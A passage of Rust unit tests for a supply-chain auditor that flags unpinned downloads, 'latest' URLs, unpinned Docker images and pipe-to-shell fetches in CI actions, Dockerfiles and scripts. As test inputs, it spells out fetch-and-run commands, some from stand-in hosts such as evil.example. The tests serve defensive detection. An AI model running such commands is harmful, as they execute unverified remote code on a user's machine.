            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_latest_curl_emits_single_high_finding() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://example.com/releases/latest/install.sh -o foo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("'latest' URL"));
    }

    #[test]
    fn shell_scan_latest_wget_emits_single_high_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "wget https://example.com/releases/latest/tool.tar.gz",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_latest_iwr_emits_single_high_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            r#"Invoke-WebRequest "https://example.com/releases/latest/tool""#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_versioned_curl_is_allowed_in_verbose() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://example.com/releases/v1.2.3/foo.tar.gz -o foo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "versioned URL");
    }

    #[test]
    fn shell_scan_versioned_curl_drops_allowed_when_not_verbose() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/releases/v1.2.3/foo.tar.gz -o foo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn js_scan_versioned_fetch_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"const r = await fetch("https://example.com/api/1.2.3/data");"#,
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
    }

    #[test]
    fn js_scan_unversioned_fetch_is_finding() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"const r = await fetch("https://example.com/api/data");"#,
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn js_scan_unversioned_got_and_http_get_are_findings() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"
const a = await got("https://example.com/api/data");
http.get("http://example.com/install.sh", cb);
https.get("https://example.com/install.sh", cb);
"#,
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 3);
        assert!(c.allowed.is_empty());
        assert!(
            c.findings
                .iter()
                .any(|f| f.description.contains("got() request"))
        );
        assert!(
            c.findings
                .iter()
                .any(|f| f.description.contains("http.get()"))
        );
    }

    #[test]
    fn js_scan_got_method_and_require_http_get_are_findings() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"
const a = await got.get("https://example.com/api/data");
const b = require("http").get("http://example.com/install.sh", cb);
const d = require("node:https").get("https://example.com/install.sh", cb);
"#,
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 3);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_pipe_to_sh_versioned_still_high() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -sSL https://example.com/releases/download/v1.2.3/install.sh | sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1, "expected exactly one finding");
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("piped to shell"));
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_pipe_to_sh_not_suppressed_by_checksum() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -sSL https://example.com/install.sh | sh\nsha256sum -c checksums.txt",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        // Pipe-to-shell is exempt: the payload is never written to disk, so a
        // nearby checksum cannot verify it. The finding stands at high severity.
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_pipe_to_sh_deduplicates_with_latest_pattern() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/releases/latest/install.sh | sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("piped to shell"));
    }

    #[test]
    fn shell_scan_proc_sub_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "bash <(curl -L https://example.com/install.sh)",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("process substitution"));
    }

    #[test]
    fn dockerfile_scan_pipe_shell_escalates_to_high() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nRUN curl -sSL https://example.com/install.sh | sh\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("piped to shell"));
    }

    #[test]
    fn dockerfile_scan_pipe_shell_across_continuation() {
        // RUN instructions lean on backslash continuations — the fetch and
        // the pipe may sit on different physical lines.
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nRUN curl -sSL https://example.com/install.sh \\\n    | sh\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert_eq!(c.findings[0].line, Some(2));
    }

    #[test]
    fn dockerfile_scan_from_platform_latest_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM --platform=linux/amd64 node:latest\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn dockerfile_scan_add_unversioned_url_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nADD https://example.com/install.tar.gz /tmp/\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("ADD with URL source"));
    }

    #[test]
    fn dockerfile_scan_add_versioned_url_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nADD https://example.com/releases/download/v1.2.3/install.tar.gz /tmp/\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "versioned URL");
    }

    #[test]
    fn dockerfile_scan_add_data_format_url_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nADD https://example.com/config.json /etc/\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
        assert_eq!(c.extra_data_format_allowed, 0);
    }

    #[test]
    fn dockerfile_scan_add_local_src_not_flagged() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nADD ./local.tar.gz /tmp/\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_data_format_url_is_allowed_not_finding() {
        // Real Homebrew/core workflow line — regression anchor.
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            r#"DATA_30="$(curl -s https://formulae.brew.sh/api/analytics/install/homebrew-core/30d.json)""#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
        assert_eq!(c.extra_data_format_allowed, 0);
    }

    #[test]
    fn shell_scan_data_format_url_dropped_without_verbose() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -s https://example.com/config.yaml -o config.yaml",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_non_data_url_still_flagged() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/install.sh -o install.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn shell_scan_fetch_piped_to_jq_is_allowed_not_finding() {
        // The crates.io registry query from bump-cargo-tools.yml: an
        // extensionless JSON API piped to jq. Data, not code — no config needed.
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            r#"LATEST=$(curl -fsSL -H "$UA" "https://crates.io/api/v1/crates/${TOOL}" | jq -r '.crate.max_stable_version')"#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "piped to jq");
    }

    #[test]
    fn shell_scan_jq_exemption_does_not_cover_later_fetch() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl https://api.example.com/v1/data | jq . && curl https://evil.example/install.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(
            c.findings[0]
                .description
                .contains("curl fetching URL without version pinning")
        );
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "piped to jq");
    }

    #[test]
    fn shell_scan_fetch_to_jq_then_shell_is_still_pipe_to_shell() {
        // jq anywhere in the pipeline must not downgrade a fetch that ends at a
        // shell — pipe-to-shell pre-empts and fires its own finding.
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -fsSL https://evil.example/c | jq -r .cmd | bash",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.findings[0].description.contains("piped to shell"));
    }

    #[test]
    fn js_scan_data_format_url_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"const r = await fetch("https://example.com/config.json");"#,
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
        assert_eq!(c.extra_data_format_allowed, 0);
    }

    #[test]
    fn py_scan_data_format_url_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_py_content(
            r#"r = requests.get("https://example.com/data.json")"#,
            "test.py",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
        assert_eq!(c.extra_data_format_allowed, 0);
    }

    #[test]
    fn shell_scan_honors_extra_data_formats() {
        let config = Config {
            extra_data_formats: vec!["proto".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -sSL https://example.com/api.proto -o schema.proto",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, REASON_EXTRA_DATA_FORMAT);
        assert_eq!(c.extra_data_format_allowed, 1);
    }

    #[test]
    fn shell_scan_non_configured_extension_still_flagged() {
        let config = Config {
            extra_data_formats: vec!["proto".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/install.sh -o install.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn shell_scan_trusted_host_is_allowed() {
        let config = Config {
            trusted_hosts: vec!["artifacts.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://artifacts.example.com/install.sh -o install.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "trusted host");
        assert_eq!(c.trusted_host_allowed, 1);
    }

    #[test]
    fn shell_scan_untrusted_host_still_flagged() {
        let config = Config {
            trusted_hosts: vec!["artifacts.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://other.example.com/install.sh -o install.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn shell_scan_trusted_host_does_not_exempt_latest() {
        // `/latest/` still fires on a trusted host — the risk is about the
        // mutable path, not about who's serving it.
        let config = Config {
            trusted_hosts: vec!["artifacts.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://artifacts.example.com/releases/latest/install.sh -o foo",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("'latest' URL"));
    }

    #[test]
    fn shell_scan_trusted_host_does_not_exempt_pipe_to_shell() {
        // Pipe-to-shell still fires on a trusted host — payload isn't
        // written to disk regardless of who's serving it.
        let config = Config {
            trusted_hosts: vec!["artifacts.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -sSL https://artifacts.example.com/install.sh | sh",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("piped to shell"));
    }

    #[test]
    fn js_scan_trusted_host_is_allowed() {
        let config = Config {
            trusted_hosts: vec!["api.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"const r = await fetch("https://api.example.com/data");"#,
            "test.js",
            "",
            &mut c,
            &config,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "trusted host");
    }

    #[test]
    fn gh_release_download_without_tag_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "gh release download -R owner/repo -p '*.tar.gz'",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("gh release download"));
    }

    #[test]
    fn js_minified_line_splitting() {
        let mut c = AuditCollector::new(false);
        // A >500-char minified line with a fetch buried inside.
        let padding = "a".repeat(450);
        let minified = format!(
            r#"{}; const r = await fetch("https://example.com/api/data"); {}"#,
            padding, padding
        );
        scan_js_content(&minified, "dist/index.js", "", &mut c, &DEFAULT_CONFIG);
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn dockerfile_digest_pinned_skipped() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu@sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890\nRUN echo hello\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn dockerfile_from_latest_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:latest\nRUN echo hello\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn dockerfile_from_no_tag_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu\nRUN echo hello\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn dockerfile_from_named_stage_not_flagged() {
        // `FROM builder` references the stage defined above, not an image pull.
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM golang:1.21 AS builder\nRUN echo build\nFROM builder\nRUN echo package\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(
            c.findings.is_empty(),
            "findings: {:?}",
            c.findings
                .iter()
                .map(|f| &f.description)
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn dockerfile_from_scratch_not_flagged() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM golang:1.21 AS builder\nFROM scratch\nCOPY --from=builder /app /app\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(
            c.findings.is_empty(),
            "findings: {:?}",
            c.findings
                .iter()
                .map(|f| &f.description)
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn dockerfile_stage_alias_collected_with_platform_flag() {
        // The stage is declared with a --platform flag; the later `FROM builder`
        // must still be recognized as a stage reference.
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM --platform=$BUILDPLATFORM golang:1.21 AS builder\nFROM builder\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(
            c.findings.is_empty(),
            "findings: {:?}",
            c.findings
                .iter()
                .map(|f| &f.description)
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn dockerfile_untagged_base_with_stage_name_still_flagged() {
        // `FROM ubuntu AS builder` pulls untagged ubuntu (implicitly :latest);
        // naming the stage must not suppress the finding on the real base.
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu AS builder\nRUN echo hi\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.findings[0].description.contains("FROM without tag"));
    }

    #[test]
    fn scan_action_yml_composite_steps() {
        let yaml: serde_norway::Value = serde_norway::from_str(
            r#"
runs:
  using: composite
  steps:
    - run: curl -L https://example.com/install.sh -o install.sh
"#,
        )
        .unwrap();
        let mut c = AuditCollector::new(false);
        scan_action_yml_runs(&yaml, "action.yml", "test-action", &mut c, &DEFAULT_CONFIG);
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn scan_action_yml_composite_parallel_steps() {
        let yaml: serde_norway::Value = serde_norway::from_str(
            r#"
runs:
  using: composite
  steps:
    - parallel:
        - run: curl https://example.com/install.sh | sh
"#,
        )
        .unwrap();
        let mut c = AuditCollector::new(false);
        scan_action_yml_runs(&yaml, "action.yml", "test-action", &mut c, &DEFAULT_CONFIG);
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn scan_action_yml_args() {
        let yaml: serde_norway::Value = serde_norway::from_str(
            r#"
runs:
  using: node20
  args: |
    curl -L https://example.com/install.sh -o install.sh
"#,
        )
        .unwrap();
        let mut c = AuditCollector::new(false);
        scan_action_yml_runs(&yaml, "action.yml", "test-action", &mut c, &DEFAULT_CONFIG);
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn scan_action_yml_sequence_args() {
        let yaml: serde_norway::Value = serde_norway::from_str(
            r#"
runs:
  using: node20
  args:
    - --flag
    - curl -L https://example.com/install.sh -o install.sh
"#,
        )
        .unwrap();
        let mut c = AuditCollector::new(false);
        scan_action_yml_runs(&yaml, "action.yml", "test-action", &mut c, &DEFAULT_CONFIG);
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn scan_action_yml_no_runs_key() {
        let yaml: serde_norway::Value = serde_norway::from_str("name: test\n").unwrap();
        let mut c = AuditCollector::new(false);
        scan_action_yml_runs(&yaml, "action.yml", "test-action", &mut c, &DEFAULT_CONFIG);
        assert!(c.findings.is_empty());
    }

    #[test]
    fn short_sha_full() {
        assert_eq!(
            short_sha("abcdef1234567890abcdef1234567890abcdef12"),
            "abcdef1"
        );
    }

    #[test]
    fn short_sha_short() {
        assert_eq!(short_sha("abc"), "abc");
    }

    #[test]
    fn remote_action_scan_key_includes_subpath() {
        let mut first = ActionRef {
            owner: "owner".to_string(),
            repo: "repo".to_string(),
            subpath: Some("a".to_string()),
            ref_string: "abcdef1234567890abcdef1234567890abcdef12".to_string(),
            ref_type: workflow::RefType::Sha,
            tag_comment: None,
            line_number: 1,
            raw_line: String::new(),
        };
        let mut second = first.clone();
        second.subpath = Some("b".to_string());

        assert_ne!(
            remote_action_scan_key(&first),
            remote_action_scan_key(&second)
        );
        first.subpath = None;
        assert_ne!(
            remote_action_scan_key(&first),
            remote_action_scan_key(&second)
        );
    }

    // ── vendored-path filtering ────────────────────────────────────────

    #[test]
    fn vendored_path_skips_dependency_dirs() {
        assert!(is_vendored_path("node_modules/lodash/index.js"));
        assert!(is_vendored_path("dist/node_modules/x.js")); // nested
        assert!(is_vendored_path(
            ".venv/lib/python3.12/site-packages/requests/api.py"
        ));
        assert!(is_vendored_path("venv/bin/thing.py"));
        assert!(is_vendored_path("tools/site-packages/pkg.py"));
    }

    #[test]
    fn vendored_path_keeps_action_code() {
        // The action's own bundled/source files must still be scanned.
        assert!(!is_vendored_path("dist/index.js"));
        assert!(!is_vendored_path("src/main.ts"));
        assert!(!is_vendored_path("action.yml"));
        assert!(!is_vendored_path("scripts/setup.py"));
    }

    #[test]
    fn vendored_path_matches_whole_components_only() {
        // Substrings and lookalike names must not be skipped.
        assert!(!is_vendored_path("node_modules_helper.js"));
        assert!(!is_vendored_path("my_vendor/index.js"));
        assert!(!is_vendored_path("src/venvironment.py"));
    }

    // ── select_source_files ────────────────────────────────────────────

    fn tree_entry(path: &str, entry_type: &str) -> crate::github::TreeEntry {
        crate::github::TreeEntry {
            path: path.into(),
            entry_type: entry_type.into(),
        }
    }

    #[test]
    fn action_yml_entrypoint_paths_stay_in_action_subpath() {
        let yaml: serde_norway::Value = serde_norway::from_str(
            r#"
runs:
  using: node20
  pre: ./preload
  main: dist/runner
  post: ../outside
"#,
        )
        .unwrap();

        assert_eq!(
            action_yml_entrypoint_paths(&yaml, "actions/sub"),
            vec![
                "actions/sub/dist/runner".to_string(),
                "actions/sub/preload".to_string()
            ]
        );
        assert!(normalize_action_entrypoint_path("", "/tmp/runner").is_none());
        assert!(normalize_action_entrypoint_path("", r"dist\\runner").is_none());
    }

    #[test]
    fn select_source_files_classifies_and_filters_in_order() {
        let tree = vec![
            tree_entry("action.yml", "blob"),
            tree_entry("dist/index.js", "blob"), // bundled action code — kept
            tree_entry("dist/index.mjs", "blob"),
            tree_entry("src/main.cjs", "blob"),
            tree_entry("src/main.ts", "blob"),
            tree_entry("setup.py", "blob"),
            tree_entry("Dockerfile", "blob"),
            tree_entry("README.md", "blob"), // not scannable
            tree_entry("node_modules/dep/i.js", "blob"), // vendored — skipped
            tree_entry("src", "tree"),       // directory entry — skipped
        ];
        let got = select_source_files(&tree, "");
        assert_eq!(
            got,
            vec![
                ("action.yml".to_string(), SourceFileKind::ActionYml),
                ("dist/index.js".to_string(), SourceFileKind::JavaScript),
                ("dist/index.mjs".to_string(), SourceFileKind::JavaScript),
                ("src/main.cjs".to_string(), SourceFileKind::JavaScript),
                ("src/main.ts".to_string(), SourceFileKind::JavaScript),
                ("setup.py".to_string(), SourceFileKind::Python),
                ("Dockerfile".to_string(), SourceFileKind::Dockerfile),
            ]
        );
    }

    #[test]
    fn select_source_files_scopes_to_subpath_base() {
        let tree = vec![
            tree_entry("action-a/action.yml", "blob"),
            tree_entry("action-a/index.js", "blob"),
            tree_entry("action-b/action.yml", "blob"), // different subpath — excluded
        ];
        let got = select_source_files(&tree, "action-a");
        assert_eq!(
            got,
            vec![
                ("action-a/action.yml".to_string(), SourceFileKind::ActionYml),
                ("action-a/index.js".to_string(), SourceFileKind::JavaScript),
            ]
        );
    }

    #[test]
    fn select_source_files_subpath_base_requires_path_boundary() {
        let tree = vec![
            tree_entry("action-a/action.yml", "blob"),
            tree_entry("action-a/index.js", "blob"),
            tree_entry("action-abcd/action.yml", "blob"),
            tree_entry("action-abcd/index.js", "blob"),
        ];
        let got = select_source_files(&tree, "action-a");
        assert_eq!(
            got,
            vec![
                ("action-a/action.yml".to_string(), SourceFileKind::ActionYml),
                ("action-a/index.js".to_string(), SourceFileKind::JavaScript),
            ]
        );
    }

    #[test]
    fn select_source_files_empty_when_nothing_scannable() {
        let tree = vec![
            tree_entry("README.md", "blob"),
            tree_entry("LICENSE", "blob"),
            tree_entry("node_modules/x/index.js", "blob"),
        ];
        assert!(select_source_files(&tree, "").is_empty());
    }

    #[test]
    fn collect_local_source_files_filters_vendored_dirs() {
        let dir = tempfile::TempDir::new().unwrap();
        let action_dir = dir.path().join(".github/actions/local");
        std::fs::create_dir_all(action_dir.join("node_modules/dep")).unwrap();
        std::fs::create_dir_all(action_dir.join("dist")).unwrap();
        std::fs::create_dir_all(action_dir.join("src")).unwrap();
        std::fs::write(action_dir.join("action.yml"), "name: local\n").unwrap();
        std::fs::write(
            action_dir.join("dist/helper.mjs"),
            "fetch('https://example.com/x')",
        )
        .unwrap();
        std::fs::write(
            action_dir.join("dist/index.js"),
            "fetch('https://example.com/x')",
        )
        .unwrap();
        std::fs::write(
            action_dir.join("src/main.cjs"),
            "fetch('https://example.com/x')",
        )
        .unwrap();
        std::fs::write(
            action_dir.join("node_modules/dep/index.js"),
            "fetch('https://evil.example/x')",
        )
        .unwrap();

        let got = collect_local_source_files(&action_dir).unwrap();
        let paths: Vec<_> = got
            .iter()
            .map(|(path, _)| {
                path.strip_prefix(&action_dir)
                    .unwrap()
                    .to_string_lossy()
                    .replace('\\', "/")
            })
            .collect();
        assert_eq!(
            paths,
            vec![
                "action.yml",
                "dist/helper.mjs",
                "dist/index.js",
                "src/main.cjs"
            ]
        );
    }

    #[test]
    fn scan_local_action_source_finds_composite_fetches() {
        let dir = tempfile::TempDir::new().unwrap();
        let action_dir = dir.path().join(".github/actions/local");
        std::fs::create_dir_all(&action_dir).unwrap();
        std::fs::write(
            action_dir.join("action.yml"),
            r#"
runs:
  using: composite
  steps:
    - run: curl -fsSL https://example.com/install.sh | bash
"#,
        )
        .unwrap();

        let action = LocalActionRef {
            path: "./.github/actions/local".to_string(),
            line_number: 12,
        };
        let mut collector = AuditCollector::new(false);
        let status =
            scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG).unwrap();
        assert_eq!(status, ActionScanStatus::Complete);
        assert_eq!(collector.findings.len(), 1);
        assert!(collector.findings[0].description.contains("piped to shell"));
        assert_eq!(
            collector.findings[0].source_file,
            "./.github/actions/local (action.yml)"
        );
    }

    #[test]
    fn scan_local_action_source_includes_metadata_entrypoint() {
        let dir = tempfile::TempDir::new().unwrap();
        let action_dir = dir.path().join(".github/actions/local");
        std::fs::create_dir_all(action_dir.join("dist")).unwrap();
        std::fs::write(
            action_dir.join("action.yml"),
            r#"
runs:
  using: node20
  main: dist/runner
"#,
        )
        .unwrap();
        std::fs::write(
            action_dir.join("dist/runner"),
            r#"fetch("https://example.com/install")"#,
        )
        .unwrap();

        let action = LocalActionRef {
            path: "./.github/actions/local".to_string(),
            line_number: 12,
        };
        let mut collector = AuditCollector::new(false);
        let status =
            scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG).unwrap();

        assert_eq!(status, ActionScanStatus::Complete);
        assert_eq!(collector.findings.len(), 1);
        assert_eq!(
            collector.findings[0].source_file,
            "./.github/actions/local (dist/runner)"
        );
    }

    #[test]
    fn scan_local_action_source_rejects_parent_escape() {
        let dir = tempfile::TempDir::new().unwrap();
        let action = LocalActionRef {
            path: "./../outside".to_string(),
            line_number: 1,
        };
        let mut collector = AuditCollector::new(false);
        assert!(
            scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG).is_err()
        );
    }

    #[test]
    fn scan_local_action_source_rejects_symlinked_action_root() {
        let dir = tempfile::TempDir::new().unwrap();
        let outside = tempfile::TempDir::new().unwrap();
        std::fs::write(outside.path().join("action.yml"), "name: outside\n").unwrap();
        let actions_dir = dir.path().join(".github/actions");
        std::fs::create_dir_all(&actions_dir).unwrap();
        std::os::unix::fs::symlink(outside.path(), actions_dir.join("local")).unwrap();

        let action = LocalActionRef {
            path: "./.github/actions/local".to_string(),
            line_number: 1,
        };
        let mut collector = AuditCollector::new(false);
        let err = scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG)
            .unwrap_err();

        assert!(
            err.to_string()
                .contains("Refusing to scan symlinked directory")
        );
        assert!(collector.findings.is_empty());
    }

    #[test]
    fn py_scan_trusted_host_is_allowed() {
        let config = Config {
            trusted_hosts: vec!["api.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(true);
        scan_py_content(
            r#"r = requests.get("https://api.example.com/data")"#,
